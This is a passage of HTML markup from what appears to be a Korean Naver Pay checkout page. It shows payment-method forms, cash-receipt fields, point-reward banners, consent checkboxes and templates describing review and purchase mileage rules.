						<p class="dsc">주문 후 2영업일 이내 <a href="/home" class="p_color_green" target="_blank">결제 내역에서 결제</a><!--N=a:ord.timeline-->해주세요.</p>
						<p class="dsc">결제 완료 후 배송이 진행됩니다.</p>
					</li>
						<li>
							<p class="dsc">지금 계좌 등록하면 나중에 더 쉽고 빠르게 결제하실 수 있어요.</p>
							<a href="#" class="link _click(nmp.front.order.order_sheet.openEasyPayBankPopup()) _stopDefault">계좌 등록</a><!--N=a:ord.adspaccount-->
						</li>
				</ul>
				<ul class="info_area _skipCreditCardInfo _skipPayMethodInfo" style="display:none;">
					<li>
						<strong>지금 즉시 결제하지 않아도 됩니다!</strong>
						<p class="dsc">주문 후 2영업일 이내 <a href="/home" class="p_color_green" target="_blank">결제 내역에서 결제</a><!--N=a:ord.timeline-->해주세요.</p>
						<p class="dsc">결제 완료 후 배송이 진행됩니다.</p>
					</li>
						<li>
							<p class="dsc">지금 카드 등록하면 나중에 더 쉽고 빠르게 결제하실 수 있어요.</p>
							<a href="#" class="link _click(nmp.front.order.order_sheet.openEasyPayCardPopup()) _stopDefault">카드 등록</a><!--N=a:ord.adspcard-->
						</li>
				</ul>
					<div class="guide_orderwish _skipLayer _skipVirtualAccountLayer" style="display:none;">
						<b class="title">잠깐! 매번 이체하기 번거로우시죠? 계좌로 결제하시면,</b>
						<ul class="benefit">
							<li>현금영수증 자동 발급</li>
							<li>주문 후 2영업일 이내 결제</li>
							<li>송금 실수 걱정없이 안전하게</li>
						</ul>
						<div class="btn_area">
							<a href="#" class="btn type_green _click(nmp.front.order.order_sheet.changeSkipBank()) _stopDefault">나중에 계좌 결제</a><!--N=a:ord.placcount-->
						</div>
						<div class="chk_txt">
							<div class="mini_checkbox">
								<span class="checkbox checkbox-applied _virtualAccountGuideCheckbox _click(nmp.front.order.order_sheet.closeBtnOfSkipLayerDuringFewDate(VirtualAccount))"><span class="checkbox-mark"></span><!--N=a:ord.nolayer--><input type="checkbox" id="virtualAccountGuideCheckbox"></span>
								<label for="virtualAccountGuideCheckbox">7일간 다시 보지 않기</label><!--N=a:ord.nolayer-->
							</div>
						</div>
						<button type="button" class="btn_close _click(nmp.front.order.order_sheet.closeBtnOfSkipLayer(VirtualAccount)) _stopDefault"><span class="blind">닫기</span></button><!--N=a:ord.closelayer-->
					</div>
			</div>	<div class="virtualAccount _tr_paymeans _accountInfo" style="display: none">
					<div class="payment_option_wrap">
						<strong class="req short">입금은행</strong>
						<div class="payment_option">
							<div class="select_section">
								<div id="bankCodeList" class="">
									<select name="nonBankBookSettleInfo.nonBankBookPayBankCode" class="selectbox-source _nonBankBookPayBankCode _payForm" style="display: none;">
										<option class="selectbox-default _selectBoxDefault" value="">선택해 주세요</option>
											<option value="011">농협</option>
											<option value="004">국민은행</option>
											<option value="088">신한은행</option>
											<option value="020">우리은행</option>
											<option value="003">기업은행</option>
											<option value="081">하나은행</option>
											<option value="031">대구은행</option>
											<option value="032">부산은행</option>
											<option value="071">우체국</option>
											<option value="023">SC제일은행</option>
											<option value="034">광주은행</option>
											<option value="039">경남은행</option>
											<option value="007">수협</option>
											<option value="089">케이뱅크</option>
									</select>
									<div class="selectbox-box">
										<div class="selectbox-label" unselectable="on">선택해 주세요</div>
									</div>
									
									<span class="drop"></span>
								</div>
							</div>
							<p class="dsc"><span class="highlight">농협, 국민, &ZeroWidthSpace;&ZeroWidthSpace;부산, SC, 우체국</span>은 ATM 현금 입금 불가 (은행 창구, 인터넷 뱅킹 이용 가능)</p>
						</div>
					</div>
					<div class="payment_option_wrap">
						<strong class="req short">환불방법<a href="#" title="?" class="sp_order ico_que _click(nmp.front.order.order_sheet.showLayerCommon(refuneMethodLayer,false,false,left)) _stopDefault"></a></strong>
						<div class="payment_option">
							<ul class="radio_inline_list inline">
								<li><span class="radio-applied _refundMethodTypeRadio _click(nmp.front.order.order_sheet.changeRefundMethod())"><span class="radio-mark"></span><input type="radio" id="refundType1" checked="checked" class="opt _refundMethod _payForm" name="refundAccountInfo.refundMethodType" value="BANK_ACCOUNT"></span> <label for="refundType1">본인계좌환불</label></li>
								<li><span class="radio-applied _refundMethodTypeRadio _click(nmp.front.order.order_sheet.changeRefundMethod())"><span class="radio-mark radio-checked"></span><input type="radio" id="refundType2" checked="checked" class="opt _refundMethod _payForm" name="refundAccountInfo.refundMethodType" value="CHARGE_AMOUNT"></span> <label for="refundType2">환불정산액 적립</label></li>
							</ul>
							<ul class="account_outer_list _refundInfo">
			
			<li class="item">
				<ul class="account_list _refundAccountList">
						<li>
							<a class="no_account _click(nmp.front.order.order_sheet.openEasyPayBankPopup())">계좌를 추가해 주세요</a>
							<button type="button" class="sp_order ico_que _click(nmp.front.order.order_sheet.showLayerRefundAccountGuide()) _stopDefault" title="?">
								<span class="blind">도움말</span>
							</button>
						</li>
				</ul>
			</li>
			
			<li class="item add_account _refundAddBankAccount" style="display:none">
				<button type="button" class="account _click(nmp.front.order.order_sheet.openEasyPayBankPopup()) _stopDefault"><span class="ico_plus">계좌 추가</span></button>
			</li>
			
			<li class="item add_account _refundViewMore" style="display: none">
				<button type="button" class="button_viewmore _click(nmp.front.order.order_sheet.toggleRefundAccountList()) _stopDefault"><span class="blind">더 보기</span></button>
			</li>				</ul>
						</div>
					</div>
				</div>
				<div class="mobile _tr_paymeans _accountInfo" style="display: none;">
					<div class="payment_option_wrap">
						<strong class="req short">결제구분</strong>
						<div class="payment_option">
							<ul class="radio_inline_list _mobileMethodArea">
								<li>
									<span class="ajax_radio radio-applied">
										<span class="radio-mark _click(nmp.front.order.order_sheet.changeMobilePayMethod(mobilePinPay))"></span>
										<input type="radio" name="mobileSettleInfo.isPinPay" value="true" id="mobilePinPay" class="_payForm _click(nmp.front.order.order_sheet.changeMobilePayMethod(mobilePinPay))">
									</span>
									<label for="mobilePinPay">간편결제</label>
								</li>
								<li>
									<span class="ajax_radio radio-applied">
										<span class="radio-mark _click(nmp.front.order.order_sheet.changeMobilePayMethod(mobilePay)) radio-checked"></span>
										<input type="radio" name="mobileSettleInfo.isPinPay" value="false" class="_payForm _click(nmp.front.order.order_sheet.changeMobilePayMethod(mobilePay))" id="mobilePay" checked="checked">
									</span>
									<label for="mobilePay">일반결제</label>
								</li>
							</ul>
						</div>
					</div>
					<div class="payment_option_wrap">
						<strong class="req short" title="필수입력">휴대폰번호</strong>
						<div class="deliver_option">
							<div class="cellphone_group _isPinMember" style="display:none;">
								<input type="text" title="핸드폰번호 첫째자리" maxlength="3" name="mobileSettleInfo.cellPhoneNo___1" value="" class="inp_txt2  _group_tel3_1 cphNo _onlyNumberTarget" disabled="">
								-
								<input type="text" title="핸드폰번호 중간" maxlength="4" name="mobileSettleInfo.cellPhoneNo___2" value="" class="inp_txt2  _group_tel3_2 cphNo _onlyNumberTarget" disabled="">
								-
								<input type="text" title="핸드폰번호 뒷자리" maxlength="4" name="" value="****" class="inp_txt2" disabled="">
								<input type="hidden" title="핸드폰번호 뒷자리" maxlength="4" name="mobileSettleInfo.cellPhoneNo___3" value="" class="inp_txt2  _group_tel3_3 cphNo">
							</div>
			
							<div class="cellphone_group _isNotPinMember">
								<!-- select box -->
								<div class="select_section">
									<div id="cellPhone3" class="">
										<select id="mobileSettleInfo.cellPhoneNo_1" name="mobileSettleInfo.cellPhoneNo___1" class="_payForm selectbox-source _group_tel3_1 cphNo _change(nmp.front.order.order_sheet.checkFirstNumber(default)) _firstNumber" style="display: none;">
											<option value="010"> 010</option>
											<option value="011"> 011</option>
											<option value="016"> 016</option>
											<option value="017"> 017</option>
											<option value="018"> 018</option>
											<option value="019"> 019</option>
										</select>
										<div class="selectbox-box">
											<div class="selectbox-label" unselectable="on"> 010</div>
										</div>
										
										<span class="drop"></span>
									</div>
								</div>
								-
								<input type="text" title="핸드폰번호 중간" maxlength="4" name="mobileSettleInfo.cellPhoneNo___2" value="" class="inp_txt2 _payForm _group_tel3_2 cphNo _onlyNumberTarget">
								-
								<input type="text" title="핸드폰번호 뒷자리" maxlength="4" name="mobileSettleInfo.cellPhoneNo___3" value="" class="inp_txt2 _payForm _group_tel3_3 cphNo _onlyNumberTarget">
							</div>
						</div>
					</div>
					<div class="payment_option_wrap _isPinMember" style="display:none;">
						<strong class="req" title="필수입력">비밀번호</strong>
						<div class="payment_option">
							<input type="password" title="비밀번호" placeholder="4자리" maxlength="4" name="mobilePassword" class="inp_txt2 addopt_msg placeholder _onlyNumberTarget password">
						</div>
						<ul class="link_list">
							<li><a href="#" class="txt_link _stopDefault _click(nmp.front.order.order_sheet.integration_cart.openPasswordManagePopup(PASS_LOST))">비밀번호 분실</a></li>
							<li><a href="#" class="txt_link _stopDefault _click(nmp.front.order.order_sheet.integration_cart.openPasswordManagePopup(PASS_CHANGE))">비밀번호 변경</a></li>
							<li><a href="#" class="txt_link _stopDefault _click(nmp.front.order.order_sheet.integration_cart.openPasswordManagePopup(PIN_CLOSE))">간편결제 해지</a></li>
						</ul>
					</div>
				</div>
			
			
			
			
			<div class="guide_box credit_event paymentMethodStatementArea" style="    display:none
			">
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			</div>
			</div>			</div>
			
			<!-- 일반결제(신용카드) - 충전결제 유도 배너 -->
			<div class="card_banner_area chargepoint_banner _chargePointUseGeneralPaymentBanner" style="display: none;">
				<a href="#chargePointScrollArea" class="charge_banner _click(nmp.front.order.order_sheet.activateChargePoint())">
					<p class="banner_txt">
						지금 결제수단 변경하면 <strong class="point _chargePointBenefitAmount">최대 311원</strong><span class="sub_text _chargePointBenefitPercent"><span class="bracket">(</span>3%<span class="bracket">)</span></span> 받기 가능!
					</p>
					<div class="banner_link">충전결제하기</div>
				</a>
			</div><!--N=a:ord.general_chargepoint_card-->
			<div class="payment_option_wrap _cashReceiptTemplate _cashReceiptHeader" style="display: block;">
				<strong class="req short_v2">현금영수증<a href="#" class="sp_order ico_que _click(nmp.front.order.order_sheet.showLayerCommon(cashReceiptInfoLayer,false,false,left)) _stopDefault" title="?"><span class="blind">현금영수증 발급안내 도움말</span></a></strong>
				<div class="payment_option">
					<ul class="radio_inline_list">
						<li><span class="ajax_radio radio-applied _click(nmp.front.order.order_sheet.isCashReceipt())"><span class="radio-mark radio-checked"></span><input type="radio" id="receiptApplyed_true" class="_payForm" name="receiptInfo.receiptApplyed" value="true" checked="checked"></span> <label for="receiptApplyed_true">신청하기</label></li>
						
					</ul>
					<ul class="radio_inline_list cashReceiptInfo">
						<li><span class="ajax_radio radio-applied _click(nmp.front.order.order_sheet.changeReceiptType())"><span class="radio-mark radio-checked"></span><input type="radio" id="receiptIssueUsageCode_1" class="_receiptIssueUsageCode _payForm" name="receiptInfo.receiptIssueUsageCode" value="PERSONAL_INCOME_TAX" checked="checked"></span> <label for="receiptIssueUsageCode_1">개인소득공제용</label></li>
						<li> </li>
					</ul>
					<div class="cash_receipt cashReceiptInfo _cashReceiptInputArea privateDeductMethod style=" display:="" block;""="" style="display: block;">
						<!-- select box -->
						<div class="select_section">
							<div id="privateCashReceiptIssueType" class="">
								<select name="receiptInfo.receiptIssueClassCode" class="selectbox-source privateCashReceiptIssueClassCode _change(nmp.front.order.order_sheet.changeCashReceiptIssueClass()) _payForm" style="display: none;">
											 <option value="PR_CELL_PHONE_NUMBER" selected="">휴대폰번호</option>
											 <option value="PR_SOCIAL_NUMBER">주민등록번호</option>
											 <option value="PR_CASH_RECEIPT_CARD_NUMBER">현금영수증카드번호</option>
								</select>
								<div class="selectbox-box">
									<div class="selectbox-label" unselectable="on">휴대폰번호</div>
								</div>
								
								<span class="drop"></span>
							</div>
						</div>
						<span style="display: none;" class="resident_group socialNumber">
							<input type="text" id="id_num" name="receiptInfo.socialNumberFirst" maxlength="6" class="inp_txt2 _onlyNumberTarget _payForm" value=""><label for="id_num" class="blind">주민등록번호 앞자리 입력</label>
							-
							<input type="password" id="id_num2" name="receiptInfo.socialNumberSecond" maxlength="7" class="inp_txt2 _onlyNumberTarget _payForm _socialNumberSecond" value=""><label for="id_num2" class="blind">뒷자리 입력</label>
						</span>
						
						<span style="display: none;" class="cardnum_group cashCard">
							<input type="text" id="receipt" name="receiptInfo.receiptCardFirst" maxlength="4" class="inp_txt2 _onlyNumberTarget _payForm" value=""><label for="receipt" class="blind">현금영수증카드번호 앞번호</label>
							-
							<input type="text" id="receipt2" name="receiptInfo.receiptCardSend" maxlength="4" class="inp_txt2 _onlyNumberTarget _payForm" value=""><label for="receipt2" class="blind">두번째 번호</label>
							-
							<input type="text" id="receipt3" name="receiptInfo.receiptCardThird" maxlength="4" class="inp_txt2 _onlyNumberTarget _payForm" value=""><label for="receipt3" class="blind">세번째 번호</label>
							-
							<input type="text" id="receipt4" name="receiptInfo.receiptCardFourth" maxlength="7" class="inp_txt2 input_receipt _onlyNumberTarget _payForm" value=""><label for="receipt4" class="blind">네번째 번호</label>
						</span>
					</div>
					<div class="businessDeductMethod cashReceiptInfo cash_receipt" style="display: none;">
						<input type="hidden" name="receiptInfo.receiptIssueClassCode" class="businessCashReceiptIssueClassCode _payForm" value="BUSINESS_REGISTRATION_NUMBER" disabled="">
						<span class="corp_reg">사업자 등록번호</span>
						<input type="text" title="사업자 등록번호 앞자리" id="order_num" name="receiptInfo.receiptBizNoFirst" maxlength="3" value="" class="inp_txt2 corp_reg_m _onlyNumberTarget _payForm"> -
						<input type="text" title="사업자 등록번호 가운데자리" name="receiptInfo.receiptBizNoSecond" maxlength="2" value="" class="inp_txt2 corp_reg_m _onlyNumberTarget _payForm"> -
						<input type="password" title="사업자 등록번호 뒷자리" name="receiptInfo.receiptBizNoThird" maxlength="5" value="" class="inp_txt2 corp_reg_l _onlyNumberTarget _payForm">
					</div>
					<div class="chk_txt cashReceiptInfo">
						<div class="s_checkbox">
							
							<label for="chk_m">위에 등록한 번호로 발송합니다</label>
						</div>
					</div>
				</div>
			</div>
			<div class="notice_box _cashReceiptNotice" style="display:none">
				<ul>
					<li class="cashReceiptIssueInfomationsDON" style="display:none">네이버페이 포인트로 결제시 현금영수증 신청을 한 경우라도 충전 수단에 따라서 현금영수증 신청이 제외 될 수 있습니다.<br>네이버페이는 <span class="pointcol">신용카드/무통장입금/계좌이체/상품권으로 충전한 충전포인트 금액</span>에 대해서만 현금영수증을 발급합니다.<br>네이버페이 포인트를 충전한 내역에 대해서는 <span class="pointcol">[포인트 &gt; 충전]</span>에서 영수증을 확인할 수 있습니다.</li>
				</ul>
			</div>
				<dl class="spot_benefit_pay benefit_fold_panel _payEventHeader _benefitAreaDisplayStatus on" style="display: block;">
					<dt class="fold_heading"><a href="#" class="_click(nmp.front.order.order_sheet.togglePayEventInfo()) _stopDefault"><strong>포인트 혜택 </strong><span class="benefit_spot_green">최대 <em class="_totalBenefitMileageWithPayEvent">405</em>원</span><span class="sp_order toggle_arrow">적립자세히보기</span></a><!--N=a:ord.benefit--></dt>
					<dd class="fold_body">
						<div class="fold_inner">
							<div class="saving_info _totalAccumulateMileageArea" style="display: table;">
								<div class="saving_item _purchaseBenefit" style="display: table-cell;">
				
				<div class="benefit_summary">
					<strong class="saving_title">구매적립<a href="#" class="sp_order ico_que _click(nmp.front.order.order_sheet.showLayerMileage(normal)) _stopDefault" title="?">도움말</a><!--N=a:ord.buybenefit--></strong>
					<em class="summary_num">총 <span>255</span>원</em>
				</div>
				<ul class="inner_list">
					
					
					
					
					
					
			
					
					<li>
						<span class="benefit_name">기본적립</span>
						<span class="benefit_sum"><b>87</b>원</span>
					</li>
					
					
					
					
					
					
					
					<li>
						<span class="benefit_name">충전포인트 결제적립</span>
						<span class="benefit_sum"><b>168</b>원</span>
					</li>
					
					
					
				</ul>
			</div>
								<div class="saving_item" style="display: table-cell;">
									<div class="saving_inner _cardBenefitItem _cardBenefit" style="display: none;"></div>
										<div class="saving_inner _reviewBenefit" style="display: block;">
				
					
					<div class="benefit_summary">
						<strong class="saving_title">리뷰적립<a href="#" class="sp_order ico_que _click(nmp.front.order.order_sheet.showLayerReviewMileage()) _stopDefault" title="?">도움말</a><!--N=a:ord.reviewbenefit--></strong>
						<em class="summary_num">최대 <span>150</span>원</em>
					</div>
				
			
				<div class="desc_text">
					<p>동일 상품의 상품리뷰/한달사용리뷰 적립은 각각 1회로 제한됩니다.</p>
				</div>
			</div>
								</div>
							</div>
						</div>
							<div class="pointplus_benefit member">
								<a href="#" class="pointplus_banner _stopDefault" style="cursor:default">
									결제 후 오늘<span class="ico_npmember"><span class="blind">네이버플러스 멤버십</span></span>가입하면 다 챙겨드려요! <strong class="point_green">+348원</strong>
								</a>
							</div>
			
					</dd>
				</dl>
					</div>
			<div class="agree_wrap">
					<div style="display: none;">
						<div class="sp_order agree_sub _productAgreement" style="display: block;">
							<div class="s_checkbox">
										<span class="checkbox checkbox-applied _click(nmp.front.order.order_sheet.checkAllAgreed())" id="buyAgree">
											<span class="checkbox-mark checkbox-checked"></span>
											<input type="checkbox" name="payAgreement" id="buy_agree2" class="_certificationForm _agreeBtn" checked="">
										</span>
								<label for="buy_agree2">위 상품의 구매조건 확인 및 결제진행 동의</label>
							</div>
						</div>
					</div>
					<div class="agree_required" style="display: none;">
						<span class="checkbox checkbox-applied _click(nmp.front.order.order_sheet.onToggleAllAgree())" id="allAgree">
							<span class="checkbox-mark checkbox-checked"></span>
							<input type="checkbox" id="all_agree" name="allAgree" class="_certificationForm _allAgreeBtn">
						</span>
						<strong class="sp_order ico_agree_required"><label for="all_agree">전체 동의하기<span class="blind">(필수)</span></label></strong>
					</div>
					<div class="agree_section">
						<div class="agreement">
								개인정보 제공 동의 :
							<em class="store">
									위드잇
							</em>
								<div class="area_detail"><button type="button" class="button_detail _click(nmp.front.order.order_sheet.showLayerCommon(commonOrderAgreeLayer,false,false,left)) _stopDefault">상세보기</button></div>
						</div>
						<div class="agreement" style="display:none;">
							쇼핑몰 구매약관 동의
							<div class="area_detail">
								<button type="button" class="button_detail _click(nmp.front.order.order_sheet.openMallProvision(true)) _stopDefault">상세보기</button>
							</div>
							<div class="sp_order agree_sub" style="display: none;">
								<div class="s_checkbox">
									<span class="checkbox checkbox-applied _click(nmp.front.order.order_sheet.checkAllAgreed())" id="mallProvisionAgree">
										<span class="checkbox-mark"></span>
										<input type="checkbox" name="isAgreeMallContract" id="mall_provision_agree" class="_certificationForm _agreeBtn" checked="">
									</span>
									<label for="mall_provision_agree">쇼핑몰 구매 약관 동의 <a href="#" class="btn_bu _click(nmp.front.order.order_sheet.openMallProvision(true)) _stopDefault" title="쇼핑몰 구매약관">상세보기<span class="ico_more2"></span></a></label>
								</div>
							</div>
						</div>
					</div>
				<div class="area_notice">
					<p class="notice">주문 내용을 확인하였으며, 정보 제공 등에 동의합니다.</p>
				</div>
			</div>
				</div>
				<div class="viewer_area _paymentInfoArea">
					<div class="payment_detail _paymentDetailInfo" style="border-bottom: 0px; display: block;">
						<h4 class="_paymentInfo creditCard" style="display:none;">결제안내</h4>
						<ul class="payinfo_list _paymentInfo creditCard" style="display:none;">
							<li><a href="#" class="btn_bu _click(nmp.front.order.order_sheet.openGuidePopup(pop_pay)) _stopDefault">안전결제 안내<span class="ico_more"></span></a></li>
							<li class="even"><a href="#" class="btn_bu _click(nmp.front.order.order_sheet.openGuidePopup(pop_click)) _stopDefault">안심클릭 안내<span class="ico_more"></span></a></li>
							<li><a href="#" class="btn_bu _click(nmp.front.order.order_sheet.openGuidePopup(pop_public_cert)) _stopDefault">공인인증서 안내<span class="ico_more"></span></a></li>
						</ul>
						<h4 class="_paymentInfo bank" style="display:none;">계좌이체 안내<a href="#" title="?" class="sp_order ico_que _click(nmp.front.order.order_sheet.openGuidePopup(pop_bank)) _stopDefault"></a></h4>
						<ul class="transferinfo_list _paymentInfo bank" style="display:none;">
							<li>[결제하기] 버튼을 클릭하신 후, 결제창에서 이체할 계좌정보를 입력해 주세요.</li>
							<li>23시 이후에는 은행별 이용 가능 시간을 미리 확인하신 후 결제를 진행해 주세요.</li>
							<li>이체 수수료는 무료 입니다.</li>
							<li class="nobul"><a href="#" class="_click(nmp.front.order.order_sheet.openGuidePopup(pop_bank_time)) _stopDefault">은행이용시간 안내<span class="ico_more"></span></a></li>
						</ul>
						<ul class="payinfo_list payinfo_list_v2 _paymentInfo bank" style="display: none;">
							<li><a href="#" class="btn_bu _click(nmp.front.order.order_sheet.openGuidePopup(pop_public_cert)) _stopDefault">공인인증서 안내<span class="ico_more"></span></a></li>
							<li class="even"><a href="#" class="btn_bu _click(nmp.front.order.order_sheet.openGuidePopup(pop_receipt_INTEGRATION_CART)) _stopDefault">증빙발급 안내<span class="ico_more"></span></a></li>
						</ul>
						<h4 class="_paymentInfo virtualAccount" style="display:none;">무통장입금 안내<a href="#" title="?" class="sp_order ico_que _click(nmp.front.order.order_sheet.openGuidePopup(pop_non_account)) _stopDefault"></a></h4>
						<ul class="transferinfo_list _paymentInfo virtualAccount" style="display:none;">
							<li><em>주문자명과 입금자명이 다르더라도</em> 발급된 가상계좌번호로 정확한 금액을 입금하시면 정상 입금확인이 가능합니다.</li>
							<li>무통장입금 시, <em>농협, 국민, 우체국, 부산, SC 제일은행은 통장/카드 없이 현금으로 ATM 기기 입금이 불가능합니다.</em> 이 경우 은행 창구 또는 인터넷 뱅킹을 이용해 주시기 바랍니다.</li>
						</ul>
						<ul class="payinfo_list payinfo_list_v2 _paymentInfo virtualAccount naverPayPoint" style="display: block; border-top: 0px;">
							<li><a href="#" class="btn_bu _click(nmp.front.order.order_sheet.openGuidePopup(pop_receipt_INTEGRATION_CART)) _stopDefault">증빙발급 안내<span class="ico_more"></span></a></li>
						</ul>
						<h4 class="_paymentInfo mobile" style="display:none;">휴대폰 결제안내<a href="#" title="?" class="sp_order ico_que _click(nmp.front.order.order_sheet.openGuidePopup(pop_cellphone)) _stopDefault"></a></h4>
						<ul class="transferinfo_list _paymentInfo mobile" style="display:none;">
							<li>휴대폰 결제는 통신사에 따라 결제 한도금액이 다릅니다.</li>
							<li>휴대폰 결제의 경우 가입하신 이동 통신사에서 증빙을 발급받을 수 있습니다.</li>
							<li>당월 취소 시, 휴대폰 결제요금에 부과 예정이던 결제금액이 취소되며, 익월 취소시에는 환불정산액으로 받으실 수 있습니다.</li>
						</ul>
					</div>
					<h4 style="margin-top:0px;display:none;"></h4>
					<div class="payment_detail guide _paymentDetailGuide" style="display: block;">
						<h4 class="_paymentInfo easyPayCard easyPayBank" style="display:none;">간편결제 안내<a href="#" title="?" class="sp_order ico_que _click(nmp.front.order.order_sheet.openGuidePopup(pop_easy_pay)) _stopDefault"></a><!--N=a:ord.simplepayinfo--></h4>
						<h4 class="_paymentInfo creditCard easyPayCard" style="display:none;">무이자할부/청구할인<a href="#" title="?" class="sp_order ico_que _click(nmp.front.order.order_sheet.openCardBenefitsPopup()) _stopDefault"></a><!--N=a:ord.cardbenefit--></h4>
						<h4>구매안전 서비스<a href="#" title="?" class="sp_order ico_que _click(nmp.front.order.order_sheet.openGuidePopup(pop_escrow_service)) _stopDefault"></a><!--N=a:ord.safetyinfo--></h4>
					</div>
				</div>
			</div>
					<div class="cutting_line cutting_line_v2">
						<span class="ico_scissors"></span>
						<span class="shdw_left"></span>
						<span class="shdw_right"></span>
					</div>
					<div class="payment_agree_wrap">
						<button class="btn_payment _click(nmp.front.order.order_sheet.account()) _stopDefault _doPayButton">결제하기</button>
						<div class="shdw_bottom"></div>
					</div>
				</div>
			<input type="hidden" name="_callback" value="nmp.front.order.order_sheet.refreshPage"></form>
			
			
			
			
			
			
			
			
			
			
			
			
					
			
					
			
					
					
					
					
			
					
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			</div>
			
			
			
			
			
			
			
			
			
			
			
			<script type="text/template" class="_tpl_layer_easypay_mileage">
				<dt>구매 적립 혜택</dt>
				<dd>
					<ul class="info_txt ly_cont_npay_list">
						<li>상품별 주문금액기준 구매확정 시 즉시 적립됩니다.</li>
						<li>쿠폰할인금액/배송비/추가구성상품가격/SSG새벽배송 알비백 보증금은 제외되며 1회 주문 기준 최대 10만원까지만 적립됩니다. (단, 무통장입금은 최대 2만원까지 적립)</li>
						<li>충전포인트/네이버통장 결제적립은 충전포인트 사용금액에서 SSG새벽배송 알비백 보증금을 차감한 금액 기준으로 적립됩니다. (복합결제 시, 간편/일반결제&gt;후불결제&gt;충전포인트 순서로 보증금 금액 차감하여 계산)</li>
						<li>간편결제/일반결제에 따라 지급되는 적립혜택이 상이할 수 있습니다.</li>
						<li>상품주문결제 금액에서 구매 적립과 리뷰 적립 포인트를 차감한 금액이 0원 미만 (마이너스 금액)일 경우 구매 적립과 리뷰 작성에 대한 포인트 적립이 제외됩니다.</li>
						<li>예약/주문 시 노출되는 적립 금액은 적립 예상 금액으로 프로모션 내용에 따라 실제 적립되는 금액과 차이가 있을 수 있습니다.<br>(프로모션 상세 조건에 따라 적립)</li>
						<li>예약은 이용완료 후 적립됩니다.</li>
						<li>네이버주문은 음식 서빙 및 픽업이 완료된 이후 적립됩니다.</li>
						<li><b>원쁠딜 공유 추가적립은 동일 상품에 대해 1회로 제한됩니다.</b></li>
					</ul>
					<table cellspacing="0" border="1" style="width:345px">
					<caption>포인트 적립혜택</caption>
					<colgroup><col><col width="38%">
					</colgroup><thead class="blind">
					<tr>
					<th scope="col">상품명</th>
					<th scope="col">구매평갯수</th>
					</tr>
					</thead>
					<tbody>
					{for index:item in items}
						<tr {if index == 0}class="first"{/if}>
						<td>{=item.productName}</td>
						{set commaMileage=nmp.utility.convertNumberFormat(=item.mileage)}
						<td class="bg_point"><strong>{=commaMileage}</strong>원</td>
						</tr>
					{/for}
					</tbody>
					</table>
					<a href="http://event2.pay.naver.com/event/benefit/list#ORDER_BENEFIT" target="_blank" class="btn_more">자세히보기</a>
				</dd>
			</script>
			
			<script type="text/template" class="_layer_card_benefit">
				<div class="dimmed _cardBenefitContentsDimmed"></div>
				<div class="ly_wrap type_tooltip _cardBenefitContents" style="margin-left:-193px;">
					<div class="ly_container type_nopayment">
						<strong class="ly_tit">혜택카드 적립</strong>
						<ul class="list_dot">
							<li class="item_dot">· 동일주문 내 모든 상품의 상태가 종료되면 구매확정 상품에 한해, 혜택카드 결제금액에 대한 혜택이 잔여한도 내에서 적립됩니다.</li>
							<li class="item_dot">· 혜택카드 잔여한도는 전체한도에서 확정 및 예정 혜택을 제외한 금액입니다.</li>
							<li class="item_dot">· 혜택 한도 소진 후 기존 주문에 대한 취소/환불 등의 사유로 한도 복구가 되더라도, 한도 소진 상태에서의 주문들에 대해서는 혜택이 소급적용 되지 않습니다.</li>
						</ul>
						<div class="area_reward">
							<div class="image">
								<img src={=cardImageUrl} width="40" height="26" alt={=cardName}>
							</div>
							<strong class="target">{=cardName}</strong>
							<span class="reward">
							<span class="cell">
								<span class="area_ellipsis">
									<span class="ellipsis">이벤트기간 내 잔여한도</span>
								</span>
							</span>
							<span class="cell">
								{set remainedCardBenefit=nmp.utility.convertNumberFormat(=remainedCardBenefitAmount)}
								<em class="point">{=remainedCardBenefit}<span class="text">원</span></em>
							</span>
						</span>
						</div>
					</div>
					<a href="#" class="clse _click(nmp.front.order.order_sheet.hideLayerCardBenefit()) _stopDefault"><span class="blind">닫기</span></a>
				</div>
			</script>
			
			
			
			<script type="text/template" class="_tpl_layer_review_mileage">
				<h5 class="layer_title">리뷰 적립 혜택</h5>
				<div class="layer_content">
					<p class="desc_guide">•텍스트 리뷰와 포토/동영상 리뷰 적립 혜택은 중복으로 지급되지 않으며, 포토/동영상 리뷰 작성 포인트는 최초 작성 시 포토/동영상을 첨부할 경우에만 적립됩니다.</p>
					{set afterUseReviewExists = "N"}
					{for index:item in items}
						{if (item.textReviewMileage.AFTER_USE > 0) || (item.photoVideoReviewMileage.AFTER_USE > 0)}
							{set afterUseReviewExists = "Y"}
						{/if}
					{/for}
					{if afterUseReviewExists == "Y"}
						<p class="desc_guide">•한달사용 리뷰 작성 추가 포인트는 구매확정 이후 30일까지 리뷰를 작성하고, 한달사용 리뷰를 추가로 작성할 때만 지급됩니다.</p>
					{/if}
					<p class="desc_guide">•동일 상품(상품번호 기준)에 대한 리뷰 적립 혜택은 리뷰/한달사용 리뷰 각각 1회로 제한되며, 적립 후 30일 경과 시 리뷰 적립혜택을 다시 받을 수 있습니다.</p>
					<p class="desc_guide">•상품 결제금액 기준 3,000원 미만인 경우 리뷰 작성에 대한 포인트 적립이 제외됩니다.</p>
					<p class="desc_guide">•상품주문결제 금액에서 구매 적립과 리뷰 적립 포인트를 차감한 금액이 0원 미만(마이너스 금액)일 경우 구매 적립과 리뷰 작성에 대한 포인트 적립이 제외됩니다.</p>
					<div class="benefit_table">
						<table class="layer_table">
							<colgroup>
								<col>
								<col width="219">
							</colgroup>
							<thead class="blind">
							<tr>
								<th scope="col">상품명</th>
								<th scope="col">적립혜택</th>
							</tr>
							</thead>
							<tbody>
							{for index:item in items}
							<tr>
								<td>{=item.productName}</td>
								<td class="benefit">
									<div class="point_list">
										{set commaNormalTextReviewMileage=nmp.utility.convertNumberFormat(=item.textReviewMileage.NORMAL)}
										{set commaNormalPhotoVideoReviewMileage=nmp.utility.convertNumberFormat(=item.photoVideoReviewMileage.NORMAL)}
										{set commaAfterUseTextReviewMileage=nmp.utility.convertNumberFormat(=item.textReviewMileage.AFTER_USE)}
										{set commaAfterUsePhotoVideoReviewMileage=nmp.utility.convertNumberFormat(=item.photoVideoReviewMileage.AFTER_USE)}
										{set commaSubscriberReviewMileage=nmp.utility.convertNumberFormat(=item.subscriberReviewMileage)}
